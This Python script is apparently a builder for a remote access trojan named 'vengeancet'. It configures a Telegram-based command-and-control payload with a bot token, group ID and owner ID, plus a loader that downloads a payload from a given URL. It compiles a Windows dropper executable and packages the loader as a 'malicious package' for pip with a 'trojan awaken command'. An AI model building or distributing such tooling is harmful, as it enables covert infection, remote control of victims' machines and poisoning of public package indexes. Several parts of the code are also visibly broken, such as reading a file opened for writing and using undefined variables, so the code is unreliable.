import argparse
from pathlib import Path
import platform
import secrets
import base64
import subprocess
import json


def building_args():
    parser = argparse.ArgumentParser(description="vengeancet rat assembler")
    parser.add_argument("--token",type=str,default="",help="You can create and obtain the bot token using @BotFather")
    parser.add_argument("--group_id",type=str,help="the telegram group id that you will use for the operation:you can obtain this Id by using  the @userinfobot or using /id  afeter adding the bot in c2 group")
    parser.add_argument("--owner_id",type=str,help="The Telegram account ID that you will use for the operation; you can obtain this ID by using the @userinfobot bot")
    parser.add_argument("--output",type=str,required=True,help="output folder")
    parser.add_argument("--payload_url_dowload",type=str,required=True,help="URL the loader will use to download the payload")
    parser.add_argument("--pip_distribuition",type=bool,default=False,help="package the payload into a pip packet")
    parser.add_argument("--build_exe",type=bool,default=False,help="create windows executable for the c2 ")
    parser.add_argument("--stdin",action="store_true",help="stdin mod")
    parser.add_argument("--credentials-file",type=str,help="")
    return parser.parse_args()

def read_credentials_file():
    credentials = json.loads(Path("credentials.json").read())
    token = credentials.token
    group_id = credentials["c2_telegram_group_id"]
    owner_id = credentials["telegram_owner_id"]
    payload_url = credentials["payload_url"]
    return token,group_id,owner_id,payload_url

def building_windows_dropper(payload_url):
     payload_url_define = f'#define PAYLOAD_URL "{payload_url}"'
     loaders_path = Path("./loaders")
     windows_loader = loaders_path / "windows_loader.c"
     with windows_loader.open("w",encoding="utf-8") as f:
         code = f.read()
         f.write(payload_url_define + code)
     process_compiler = subprocess.run(["x86_64-w64-mingw32-gcc",windows_loader,"-o","loader.exe"],check=True)
     if process_compiler.returncode == 0:
         print("loader.exe generated successfully")  
     else:
         print("error Install the x86_64-w64-mingw32-gc after try again")


def create_pip_package(output_name: str, loader_code: str):
    print("configure the malicious package")
    name = input("package name: ").strip()
    description = input("package description: ").strip()
    version = input("package version: ").strip()
    trojan_awaken_command = input("trojan awaken command: ").strip()

    pip_package_folder = Path(output_name)
    package_src_folder = pip_package_folder / "src" / name
    package_src_folder.mkdir(parents=True, exist_ok=True)

    pyproject = pip_package_folder / "pyproject.toml"
    init = package_src_folder / "__init__.py"
    payload_file = package_src_folder / "core.py"


    with pyproject.open("w", encoding="utf-8") as f:
        f.write(f"""[build-system]
requires = ["setuptools>=68"]
build-backend = "setuptools.build_meta"

[project]
name = "{name}"
description = "{description}"
version = "{version}"
requires-python = ">=3.10"
license = {{text = "GPL-3.0-or-later"}}

[project.scripts]
{trojan_awaken_command} = "{name}.core:wakeup"

[tool.setuptools.packages.find]
where = ["src"]
""")


    with init.open("w", encoding="utf-8") as f:
        f.write(f'__version__ = "{version}"\n')

    print(f"\nPackage created at: {pip_package_folder}")
    print("To install in editable mode:")
    print(f"    pip install -e {pip_package_folder}")
    print("To build wheel/sdist:")
    print(f"    python -m build {pip_package_folder}")


    with loader.write("w",encoding="utf-8") as f:
        f.write(loader_code)
    with pyproject.open("w",encoding="utf-8") as f:
        pyproject_content = f"""
        [build-system]
        requires = ["setuptools>=68"]
        build-backend = "setuptools.build_meta"

        [project]
        name = "{name}"
        description = "{description}"
        version = "{version}"
        requires-python = ">=3.10"

        [project.scripts]
        {trojan_awaken_command} = {output_name}.core:main

        """
        f.write(pyproject_content)

def main(args):
    token = args.token 
    telegram_c2_group_id = args.group_id
    telegram_owner_id = args.owner_id
    payload_url = args.payload_url
    if args.build_exe:
        building_windows_dropper(payload_url)
    if args.credentials-file:
        token,group_id,owner_id,payload_url= read_credentials_file()

    template_payload = Path("payload.py")
    template_loader = Path("loader.py")
    output_folder = Path(args.output)
    output_folder.mkdir(exist_ok=True)


    if template_payload.exists() and template_loader.exists():
         payload = output_folder / "payload.py"
         loader = output_folder / "loader.py"
    else:
        print("[*]error loader or payload not found")

    payload_template_code = template_payload.read_text()
    loader_template_code = template_loader.read_text()

    configure_c2 = f"""
token = "{token}"
c2_group_id = "{group_id}"
owner_id = int({owner_id})
key = "{secrets.token_hex(32)}"
"""

    configure_loader = f'url = "{args.payload_url}"\n'

    with payload.open("w",encoding="utf-8") as f:
        f.write(f"{configure_c2}{payload_template_code}")
    with loader.open("w",encoding="utf-8") as f:
        f.write(f"{configure_loader}{loader_template_code}")

    if pip_distribuition == True:
        create_pip_package(output_folder,loader.read_text())

if __name__ == "__main__":
    ascii_art = open("./assets/banner.txt").read()
    print(ascii_art)
    args = building_args()
    main(args)
